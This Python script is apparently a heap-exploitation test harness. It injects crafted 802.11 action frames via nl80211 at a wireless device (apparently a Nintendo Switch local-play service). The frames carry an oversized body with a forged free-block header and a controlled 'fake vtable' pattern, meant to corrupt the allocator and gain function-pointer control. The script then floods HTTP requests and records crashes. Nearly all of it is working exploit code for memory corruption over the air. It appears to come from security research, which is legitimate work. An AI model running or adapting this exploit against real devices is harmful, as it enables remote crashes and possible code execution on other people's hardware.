#!/usr/bin/env -S python3 -u
"""Test heap overlapping allocation via forged free block size.

CONFIRMED: We can write arbitrary data to parser+0x5D8:0x85C (596 bytes)
as long as we preserve the free block header at parser+0x7AC with:
  magic=0x4652 (FR), attr=0x0001, size=0x0020

THEORY: If we change the free block size from 0x20 to a LARGE value,
after the parser is freed, the allocator coalesces the parser allocation
with this forged "large" free block. The resulting free block extends
past actual live allocations. The NEXT allocation from this heap could
overlap with live objects, giving us function pointer control.

Test plan:
1. Verify forged size doesn't crash (we keep magic/attr correct)
2. Test various sizes to find one that triggers observable behavior
3. After parser free, trigger a new heap allocation (via HTTP request)
   to see if the allocator uses the forged block
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_forged_body(free_size, controlled_data=None):
    """Build body_size=0x800 with forged free block size.

    Layout:
      body[0x000:0x57C] = normal parser body
      body[0x57C:0x750] = heap data (zeros or controlled)
      body[0x750:0x768] = forged free block header
      body[0x768:0x800] = post-free data (zeros or controlled)
    """
    body_size = 0x800
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)

    if controlled_data:
        cd = controlled_data[:0x284]
        body[0x57C:0x57C + len(cd)] = cd

    # Forge free block header at body[0x750:0x768]
    struct.pack_into("<H", body, 0x750, 0x4652)   # magic FR
    struct.pack_into("<H", body, 0x752, 0x0001)   # attr
    struct.pack_into("<I", body, 0x754, free_size) # FORGED size
    # prev=0, next=0 (body already zeroed)

    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def check_http_response():
    """Get HTTP response details to detect behavioral changes."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(4096)
        s.close()
        lines = d.decode('utf-8', errors='replace').split('\r\n')
        status = lines[0] if lines else "?"
        content_len = None
        for l in lines:
            if l.lower().startswith('content-length:'):
                content_len = int(l.split(':')[1].strip())
        return {"status": status, "content_length": content_len, "total_bytes": len(d)}
    except Exception as e:
        return {"error": str(e)}


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test(fam_id, ifindex, name, free_size, controlled_data=None, frame_count=80):
    if not check_alive():
        if not wait_alive(30):
            print(f"  {name:55s} → SKIP")
            return None

    # Get baseline HTTP response before attack
    pre_http = check_http_response()

    body = build_forged_body(free_size, controlled_data)
    frame = build_frame(body)

    for i in range(frame_count):
        err = send_frame(fam_id, ifindex, frame)
        if err != 0:
            break
        time.sleep(0.002)

    # Wait for join handler to timeout (500ms) and free parser
    time.sleep(2)

    # Trigger HTTP request (forces heap allocation in service)
    post_http1 = check_http_response()

    time.sleep(3)
    post_http2 = check_http_response()

    ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                           capture_output=True).returncode == 0

    if "error" not in post_http2 and ping:
        result = "OK"
    elif ping and "error" in post_http2:
        result = "HTTP_DOWN"
    else:
        result = "CRASH"

    print(f"  {name:55s} → {result}")
    if post_http1 != pre_http or post_http2 != pre_http:
        print(f"    Pre:  {pre_http}")
        print(f"    Post1: {post_http1}")
        print(f"    Post2: {post_http2}")

    return {"name": name, "free_size": free_size, "result": result,
            "pre_http": pre_http, "post_http1": post_http1, "post_http2": post_http2}


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    results = []

    # Phase 1 results (already confirmed): ALL sizes OK
    # original_0x20, small_0x100, medium_0x400, large_0x1000,
    # huge_0x4000, massive_0x10000, giant_0x40000 → all OK
    print("\n  Phase 1 (cached): ALL forged sizes (0x20-0x40000) OK")

    # Phase 2: Controlled data with forged size
    print(f"\n{'='*65}")
    print("  PHASE 2: Forged size + controlled data payload")
    print("="*65)

    # Build controlled data: a pattern we can identify if it ends up
    # in a live object (e.g., a fake vtable with magic values)
    controlled = bytearray(0x284)
    # Fill with identifiable pattern
    for i in range(0, 0x284 - 7, 8):
        struct.pack_into("<Q", controlled, i, 0xDEAD000000000000 + i)

    r = test(fam_id, ifindex, "controlled_0x4000", 0x4000, bytes(controlled))
    if r:
        results.append(r)
    if r and r["result"] != "OK":
        time.sleep(15)
        wait_alive(30)

    # Phase 3: Trigger multiple HTTP requests after overflow to stress heap
    print(f"\n{'='*65}")
    print("  PHASE 3: Heap stress after forged overflow")
    print("="*65)

    if not check_alive():
        wait_alive(30)

    body = build_forged_body(0x10000)
    frame = build_frame(body)

    print("  Sending overflow frames...")
    for i in range(80):
        send_frame(fam_id, ifindex, frame)
        time.sleep(0.002)

    print("  Waiting for parser free (500ms timeout)...")
    time.sleep(2)

    print("  Flooding HTTP requests to trigger heap allocations...")
    http_results = []
    for i in range(20):
        r = check_http_response()
        http_results.append(r)
        if "error" in r:
            print(f"    HTTP request {i}: {r}")
            break
        time.sleep(0.1)

    alive = check_alive()
    ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                           capture_output=True).returncode == 0

    if alive and ping:
        print("  Service survived heap stress!")
    elif ping:
        print("  HTTP DOWN after heap stress")
    else:
        print("  CRASH after heap stress")

    results.append({
        "name": "heap_stress_0x10000",
        "result": "OK" if alive and ping else "HTTP_DOWN" if ping else "CRASH",
        "http_requests": len(http_results),
        "last_http": http_results[-1] if http_results else None
    })

    # Summary
    print(f"\n{'='*65}")
    print("  SUMMARY")
    print("="*65)
    for r in results:
        marker = " ***" if r.get("result") not in ("OK", None) else ""
        print(f"  {r.get('name','?'):55s} → {r.get('result','?')}{marker}")

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "heap_overlap_test.json")
    with open(outfile, "w") as f:
        json.dump({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "results": results}, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
